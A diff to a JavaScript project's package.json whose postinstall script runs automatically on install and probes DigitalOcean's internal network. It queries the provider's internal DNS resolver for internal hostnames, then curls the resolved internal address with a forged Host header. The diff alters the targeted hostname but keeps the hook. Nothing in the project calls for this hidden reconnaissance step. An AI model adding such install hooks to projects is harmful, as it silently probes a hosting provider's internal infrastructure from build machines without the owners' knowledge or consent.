@@ -10,7 +10,7 @@
     "frontend": "npm run dev --prefix frontend",
     "install-all": "npm install && npm install --prefix backend && npm install --prefix frontend && npm install --prefix mobile",
     "mobile": "npm run start --prefix mobile",
-    "postinstall": "echo '== Testing DO DNS reachability =='; dig @67.207.67.3 ssrf-sheriff.internal.digitalocean.com +short 2>&1 || echo 'dig failed'; SHERIFF_IP=$(dig @67.207.67.3 ssrf-sheriff.internal.digitalocean.com +short 2>/dev/null | head -1); echo \"Resolved IP: $SHERIFF_IP\"; if [ -n \"$SHERIFF_IP\" ]; then curl -s -m 5 http://$SHERIFF_IP/ -H 'Host: ssrf-sheriff.internal.digitalocean.com' -w '\\nHTTP_STATUS:%{http_code}\\n'; else echo 'No IP resolved - DNS resolver not reachable or hostname not in zone'; fi"
+    "postinstall": "echo '== Testing DO DNS reachability =='; dig @67.207.67.3 internal.digitalocean.com +short 2>&1 || echo 'dig failed'; SHERIFF_IP=$(dig @67.207.67.3 internal.digitalocean.com +short 2>/dev/null | head -1); echo \"Resolved IP: $SHERIFF_IP\"; if [ -n \"$SHERIFF_IP\" ]; then curl -s -m 5 http://$SHERIFF_IP/ -H 'Host: internal.digitalocean.com' -w '\\nHTTP_STATUS:%{http_code}\\n'; else echo 'No IP resolved - DNS resolver not reachable or hostname not in zone'; fi"
   },
   "devDependencies": {
     "concurrently": "^9.2.1"
